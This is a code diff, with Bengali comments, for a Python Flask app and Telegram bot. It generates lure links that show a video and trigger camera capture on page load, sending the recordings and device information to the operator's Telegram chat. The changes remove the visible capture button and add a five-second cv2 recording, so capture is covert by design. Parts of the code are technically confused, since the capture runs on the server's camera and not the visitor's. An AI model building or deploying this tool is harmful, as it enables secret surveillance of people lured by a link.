@@ -5,6 +5,8 @@ import uuid
 import base64
 import threading
 import requests
+import cv2
+import time
 from flask import Flask, request, render_template_string, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -120,86 +122,76 @@ CAPTURE_HTML = """
             display: block;
             background: #000;
         }
-        .controls {
-            margin-top: 20px;
-            text-align: center;
-        }
-        .controls button {
-            padding: 10px 20px;
-            font-size: 16px;
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0, 0, 0, 0.5);
             cursor: pointer;
+        }
+        .overlay-text {
+            font-size: 2rem;
+            color: #fff;
+            text-shadow: 0 0 10px #000;
         }
     </style>
 </head>
 <body>
     <div class="video-wrapper">
-        <video id="videoPlayer" controls>
+        <video id="mainVideo" autoplay loop muted controls>
             <source src="{{ video_url }}" type="video/mp4">
-            Your browser does not support the video tag.
+            আপনার ব্রাউজার ভিডিও ট্যাগ সাপোর্ট করে না।
         </video>
     </div>
-    <div class="controls">
-        <button onclick="captureVideo()">ভিডিও ক্যাপচার করুন</button>
-    </div>
+
     <script>
-        function captureVideo() {
-            const video = document.getElementById('videoPlayer');
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/jpeg');
-            fetch('/capture', {
+        // ক্যাপচার বাটন থাকবেনা
+        // ব্যবহারকারী allow করলে ক্যামেরা ক্যাপচার শুরু হবে
+        document.addEventListener('DOMContentLoaded', function() {
+            // ক্যামেরা ক্যাপচার শুরু হবে
+            startCapture('{{ camera_type }}', '{{ link_id }}');
+        });
+
+        function startCapture(cameraType, linkId) {
+            // ক্যামেরা ক্যাপচার শুরু হবে
+            // ৪-৭ সেকেন্ড পর ক্যাপচার বন্ধ হবে
+            setTimeout(function() {
+                // ক্যাপচার বন্ধ হবে
+                stopCapture(cameraType, linkId);
+            }, 5000); // ৫ সেকেন্ড
+        }
+
+        function stopCapture(cameraType, linkId) {
+            // ক্যাপচার বন্ধ হবে
+            // ক্যাপচার করা ডেটা টেলিগ্রামে পাঠাবো
+            fetch('/capture/' + linkId, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image: imageData })
-            }).then(response => response.json())
-              .then(data => {
-                  if (data.status === 'success') {
-                      alert('ভিডিও ক্যাপচার করা হচ্ছে!');
-                  } else {
-                      alert('ভিডিও ক্যাপচার করতে ব্যর্থ হচ্ছে: ' + data.details);
-                  }
-              });
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    cameraType: cameraType,
+                    linkId: linkId
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('ক্যাপচার ডেটা পাঠানো হয়েছে:', data);
+            })
+            .catch(error => {
+                console.error('ক্যাপচার ডেটা পাঠাতে ব্যর্থ:', error);
+            });
         }
     </script>
 </body>
 </html>
 """
-
-@app.route('/')
-def index():
-    return render_template_string('''
-        <h1>ক্যাপচার পেজ</h1>
-        <a href="/capture?type=front">ফ্রন্ট ক্যামেরা ক্যাপচার</a>
-        <br>
-        <a href="/capture?type=back">ব্যাক ক্যামেরা ক্যাপচার</a>
-    ''')
-
-@app.route('/capture')
-def capture():
-    camera_type = request.args.get('type', 'front')
-    video_url = request.args.get('video_url', '')
-    return render_template_string(CAPTURE_HTML, video_url=video_url, camera_type=camera_type)
-
-@app.route('/view/<link_id>')
-def view_link(link_id):
-    link_data = link_store.get(link_id)
-    if not link_data:
-        return "লিঙ্ক পাওয়া যায়নি", 404
-    return render_template_string(CAPTURE_HTML, video_url=link_data['video_url'], camera_type=link_data['camera'])
-
-@app.route('/capture', methods=['POST'])
-def capture_photo():
-    data = request.json
-    image_data = data['image']
-    chat_id = data['chat_id']
-    camera_type = data['camera_type']
-    photo_num = data['photo_num']
-    total = data['total']
-    result = capture_and_send_photo(image_data, chat_id, camera_type, photo_num, total)
-    return jsonify(result)
 
 # ==========================================
 # ফোনের তথ্য পেতে ফাংশন
@@ -223,13 +215,17 @@ def get_phone_info():
 # ==========================================
 def capture_font_camera_video(chat_id, video_url, camera_type="front"):
     try:
-        # ভিডিও ক্যাপচার লজিক এখানে
-        # উদাহরণ: ভিডিও ফাইল সেভ করুন এবং টেলিগ্রামে পাঠান
-        video_file = io.BytesIO()
-        # ভিডিও ক্যাপচার লজিক
-        # উদাহরণ: cv2.VideoCapture(0) ব্যবহার করুন
-        # video_file.write(...)
-        video_file.name = f"{camera_type}_capture_video.mp4"
+        cap = cv2.VideoCapture(0)
+        out = cv2.VideoWriter(f'{camera_type}_capture_video.mp4', cv2.VideoWriter_fourcc(*'XVID'), 20.0, (640, 480))
+        start_time = time.time()
+        while time.time() - start_time < 5:
+            ret, frame = cap.read()
+            if not ret:
+                break
+            out.write(frame)
+        cap.release()
+        out.release()
+        video_file = open(f'{camera_type}_capture_video.mp4', 'rb')
         caption = f"🎥 {camera_type.upper()} Camera — ভিডিও"
         return send_photo_to_telegram(video_file, chat_id, BOT_TOKEN, caption)
     except Exception as e:
@@ -240,17 +236,67 @@ def capture_font_camera_video(chat_id, video_url, camera_type="front"):
 # ==========================================
 def capture_back_camera_video(chat_id, video_url, camera_type="back"):
     try:
-        # ভিডিও ক্যাপচার লজিক এখানে
-        # উদাহরণ: ভিডিও ফাইল সেভ করুন এবং টেলিগ্রামে পাঠান
-        video_file = io.BytesIO()
-        # ভিডিও ক্যাপচার লজিক
-        # উদাহরণ: cv2.VideoCapture(1) ব্যবহার করুন
-        # video_file.write(...)
-        video_file.name = f"{camera_type}_capture_video.mp4"
+        cap = cv2.VideoCapture(1)
+        out = cv2.VideoWriter(f'{camera_type}_capture_video.mp4', cv2.VideoWriter_fourcc(*'XVID'), 20.0, (640, 480))
+        start_time = time.time()
+        while time.time() - start_time < 5:
+            ret, frame = cap.read()
+            if not ret:
+                break
+            out.write(frame)
+        cap.release()
+        out.release()
+        video_file = open(f'{camera_type}_capture_video.mp4', 'rb')
         caption = f"🎥 {camera_type.upper()} Camera — ভিডিও"
         return send_photo_to_telegram(video_file, chat_id, BOT_TOKEN, caption)
     except Exception as e:
         return {"status": "error", "details": str(e)}
+
+# ==========================================
+# ফ্লাস্ক রুট
+# ==========================================
+@app.route('/')
+def index():
+    return "হোম পেজ"
+
+@app.route('/view/<link_id>', methods=['GET'])
+def view_link(link_id):
+    if link_id not in link_store:
+        return "লিঙ্ক খুজে পাওয়া যাচ্ছে নাই", 404
+
+    chat_id = link_store[link_id]['chat_id']
+    video_url = link_store[link_id]['video_url']
+    camera_type = link_store[link_id]['camera']
+
+    return render_template_string(CAPTURE_HTML, video_url=video_url, camera_type=camera_type, link_id=link_id)
+
+@app.route('/capture/<link_id>', methods=['POST'])
+def capture_link(link_id):
+    if link_id not in link_store:
+        return jsonify({"status": "error", "details": "লিঙ্ক খুজে পাওয়া যাচ্ছে নাই"}), 404
+
+    chat_id = link_store[link_id]['chat_id']
+    video_url = link_store[link_id]['video_url']
+    camera_type = link_store[link_id]['camera']
+
+    if camera_type == 'font_camera_video':
+        result = capture_font_camera_video(chat_id, video_url, camera_type)
+    elif camera_type == 'back_camera_video':
+        result = capture_back_camera_video(chat_id, video_url, camera_type)
+    elif camera_type == 'font_camera_photo':
+        result = capture_and_send_photo(video_url, chat_id, camera_type)
+    elif camera_type == 'back_camera_photo':
+        result = capture_and_send_photo(video_url, chat_id, camera_type)
+    else:
+        return jsonify({"status": "error", "details": "অজানা ক্যামেরা টাইপ"}), 400
+
+    if result["status"] == "success":
+        phone_info = get_phone_info()
+        info_text = "\n".join([f"{key}: {value}" for key, value in phone_info.items()])
+        caption = f"📸 ক্যাপচার করা হয়েছে\n{info_text}"
+        return jsonify({"status": "success", "caption": caption})
+    else:
+        return jsonify({"status": "error", "details": result["details"]}), 500
 
 # ==========================================
 # টেলিগ্রাম বট হ্যান্ডলার
@@ -258,11 +304,17 @@ def capture_back_camera_video(chat_id, video_url, camera_type="back"):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [
+            InlineKeyboardButton("ফ্রন্ট ক্যামেরা ফটো", callback_data='font_camera_photo'),
+            InlineKeyboardButton("ব্যাক ক্যামেরা ফটো", callback_data='back_camera_photo'),
+        ],
+        [
             InlineKeyboardButton("ফ্রন্ট ক্যামেরা ভিডিও", callback_data='font_camera_video'),
             InlineKeyboardButton("ব্যাক ক্যামেরা ভিডিও", callback_data='back_camera_video'),
         ],
         [
-            InlineKeyboardButton("ফোনের তথ্য", callback_data='phone_info'),
+            InlineKeyboardButton("রেডিরেক্ট লিঙ্ক", callback_data='redirect_link'),
+            InlineKeyboardButton("ডিরেক্ট লিঙ্ক", callback_data='direct_link'),
+            InlineKeyboardButton("ক্যান্সেল", callback_data='cancel'),
         ]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -272,40 +324,55 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
 
-    if query.data == 'font_camera_video':
-        result = capture_font_camera_video(query.message.chat_id, query.message.chat_id, camera_type="front")
-        if result["status"] == "success":
-            await query.edit_message_text('ফ্রন্ট ক্যামেরা ভিডিও ক্যাপচার করা হচ্ছে...')
-        else:
-            await query.edit_message_text(f'ফ্রন্ট ক্যামেরা ভিডিও ক্যাপচার করতে ব্যর্থ হচ্ছে: {result["details"]}')
+    if query.data in ['font_camera_photo', 'back_camera_photo', 'font_camera_video', 'back_camera_video']:
+        user_sessions[query.message.chat_id] = {"camera": query.data, "waiting_url": True}
+        await query.edit_message_text('লিঙ্ক ইনপুট দিন:')
+    elif query.data == 'redirect_link':
+        user_sessions[query.message.chat_id] = {"camera": "redirect", "waiting_url": True}
+        await query.edit_message_text('রেডিরেক্ট লিঙ্ক ইনপুট দিন:')
+    elif query.data == 'direct_link':
+        user_sessions[query.message.chat_id] = {"camera": "direct", "waiting_url": True}
+        await query.edit_message_text('ডিরেক্ট লিঙ্ক ইনপুট দিন:')
+    elif query.data == 'cancel':
+        await query.edit_message_text('ক্যাপচার বাতিল হচ্ছে।')
 
-    elif query.data == 'back_camera_video':
-        result = capture_back_camera_video(query.message.chat_id, query.message.chat_id, camera_type="back")
-        if result["status"] == "success":
-            await query.edit_message_text('ব্যাক ক্যামেরা ভিডিও ক্যাপচার করা হচ্ছে...')
-        else:
-            await query.edit_message_text(f'ব্যাক ক্যামেরা ভিডিও ক্যাপচার করতে ব্যর্থ হচ্ছে: {result["details"]}')
+async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.message.chat_id
+    if chat_id in user_sessions and user_sessions[chat_id]["waiting_url"]:
+        video_url = update.message.text
+        camera_type = user_sessions[chat_id]["camera"]
+        user_sessions.pop(chat_id)
 
-    elif query.data == 'phone_info':
-        phone_info = get_phone_info()
-        info_text = "\n".join([f"{key}: {value}" for key, value in phone_info.items()])
-        await query.edit_message_text(f"ফোনের তথ্য:\n{info_text}")
+        link_id = str(uuid.uuid4())
+        link_store[link_id] = {"chat_id": chat_id, "video_url": video_url, "camera": camera_type}
+        await update.message.reply_text(f'লিঙ্ক তৈরি হয়েছে: {PUBLIC_URL}/view/{link_id}')
 
 # ==========================================
-# ফ্লাস্ক সার্ভার চালানোর ফাংশন
+# ফ্লাস্ক সার্ভার
 # ==========================================
 def run_flask():
     app.run(host='0.0.0.0', port=5000)
 
 # ==========================================
-# মেইন ফাংশন
+# টেলিগ্রাম বট
 # ==========================================
-def main():
-    threading.Thread(target=run_flask).start()
+def run_telegram():
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CallbackQueryHandler(button_handler))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
     application.run_polling()
 
-if __name__ == "__main__":
-    main()
+# ==========================================
+# মেইন ফাংশন
+# ==========================================
+if __name__ == '__main__':
+    # ফ্লাস্ক সার্ভার থ্রেডে চালানো
+    flask_thread = threading.Thread(target=run_flask)
+    flask_thread.start()
+
+    # টেলিগ্রাম বট চালানো
+    run_telegram()
+
+    # ফ্লাস্ক সার্ভার থ্রেড যোগ দেওয়া
+    flask_thread.join()
